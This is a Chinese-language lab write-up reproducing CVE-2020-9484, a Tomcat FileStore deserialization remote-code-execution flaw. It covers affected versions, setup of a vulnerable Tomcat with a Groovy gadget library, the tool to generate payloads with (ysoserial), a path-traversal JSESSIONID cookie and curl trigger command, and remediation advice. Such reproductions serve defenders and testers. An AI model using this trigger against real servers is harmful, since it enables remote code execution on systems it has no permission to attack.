## 漏洞描述

2020年05月21日，Apache官方发布了 Apache Tomcat 远程代码执行 的风险通告，该漏洞编号为
CVE-2020-9484，官方对该漏洞评级：高危。

当用户在使用tomcat时启用了session持久化功能FileStore，例（conf/context.xml）如果恶意用户可以上传指定后缀（.session）的文件时，利用反序列化，将能造成服务端远程代码执行，原因在于FileStore类读取文件时，使用了JSESSIONID的名称，没有过滤“/../”这样的目录穿越。

## 影响版本

Apache Tomcat : 10.0.0-M1 to 10.0.0-M4

Apache Tomcat : 9.0.0.M1 to 9.0.34

Apache Tomcat : 8.5.0 to 8.5.54

Apache Tomcat : 7.0.0 to 7.0.103

## 环境搭载

 ** **安装tomcat需要java8环境，Java8环境安装教程****

1、建立目录，将下载的jdk复制过去并解压

![1635832460_6180d28ca28cccf34c200.png!small?1635832461746](https://image.3001.net/images/20211102/1635832460_6180d28ca28cccf34c200.png!small?1635832461746)

2、配置环境变量  
![1635832527_6180d2cf64368473d1896.png!small?1635832528495](https://image.3001.net/images/20211102/1635832527_6180d2cf64368473d1896.png!small?1635832528495)

3、通知系统java的位置

![1635832588_6180d30c6c23c553a3319.png!small?1635832589534](https://image.3001.net/images/20211102/1635832588_6180d30c6c23c553a3319.png!small?1635832589534)

4、设置默认JDK

![1635832614_6180d3264df300f16db99.png!small?1635832615439](https://image.3001.net/images/20211102/1635832614_6180d3264df300f16db99.png!small?1635832615439)

5、重新载入profile

![1635832635_6180d33bb2113a7a51fae.png!small?1635832636794](https://image.3001.net/images/20211102/1635832635_6180d33bb2113a7a51fae.png!small?1635832636794)

6、通过 java -version以及javac -version即可看到是否安装完成

![1635832655_6180d34f2f5c12582976b.png!small?1635832656310](https://image.3001.net/images/20211102/1635832655_6180d34f2f5c12582976b.png!small?1635832656310)

 ** **搭建一个tomcat服务，下载tomcat 10.0.0-M4，下载地址：****

[
_https://repo1.maven.org/maven2/org/apache/tomcat/tomcat/10.0.0-M4/tomcat-10.0.0-M4.tar.gz_](https://repo1.maven.org/maven2/org/apache/tomcat/tomcat/10.0.0-M4/tomcat-10.0.0-M4.tar.gz)

在/usr/local/下创建一个tomcat目录，将文件解压进去

![1635832686_6180d36ea3c7ccaf774c8.png!small?1635832687724](https://image.3001.net/images/20211102/1635832686_6180d36ea3c7ccaf774c8.png!small?1635832687724)

![1635832702_6180d37e9f119da9cabff.png!small?1635832703728](https://image.3001.net/images/20211102/1635832702_6180d37e9f119da9cabff.png!small?1635832703728)

![1635832715_6180d38b94e260985b174.png!small?1635832716836](https://image.3001.net/images/20211102/1635832715_6180d38b94e260985b174.png!small?1635832716836)

修改/usr/local/tomcat/conf/context.xlm 添加Manager

yum安装wget程序

![1635832736_6180d3a0500505519f0c5.png!small?1635832737465](https://image.3001.net/images/20211102/1635832736_6180d3a0500505519f0c5.png!small?1635832737465)

下载groovy-2.3.9.jar，然后将groovy-2.3.9.jar 放入/usr/local/tomcat/lib目录下

在lib下执行：wget
https://repo1.maven.org/maven2/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar

  

运行tomcat：/usr/local/tomcat/apache-tomcat-10.0.0-M4/bin/catalina.sh start

![1635832751_6180d3afd0a3ba82d5634.png!small?1635832752924](https://image.3001.net/images/20211102/1635832751_6180d3afd0a3ba82d5634.png!small?1635832752924)

浏览器访问http://ip:8080，出现如下界面表示安装成功

![1635832766_6180d3be2bc1b74481610.png!small?1635832767337](https://image.3001.net/images/20211102/1635832766_6180d3be2bc1b74481610.png!small?1635832767337)

##  ** **漏洞利用****

找一个ysoserial 一个生成java反序列化 payload 的 .jar 包

![1635832787_6180d3d368ec5c896c145.png!small?1635832788520](https://image.3001.net/images/20211102/1635832787_6180d3d368ec5c896c145.png!small?1635832788520)

在浏览器抓取首页的包添加Cookie: JSESSIONID=../../../../../tmp/test

![1635832802_6180d3e27eddf8487644f.png!small?1635832803790](https://image.3001.net/images/20211102/1635832802_6180d3e27eddf8487644f.png!small?1635832803790)

或者直接在环境中执行POC通过JSESSION加载恶意的session持久化文件

curl 'http://172.16.1.186:8080/index.jsp' -H 'Cookie:
JSESSIONID=../../../../../tmp/test'

![1635832826_6180d3fa4e722e355cfcb.png!small?1635832827545](https://image.3001.net/images/20211102/1635832826_6180d3fa4e722e355cfcb.png!small?1635832827545)

##  ** **修复方式****

升级版本,或者配置WAF，过滤掉../之类的字符串，或者不使用 FileStore。

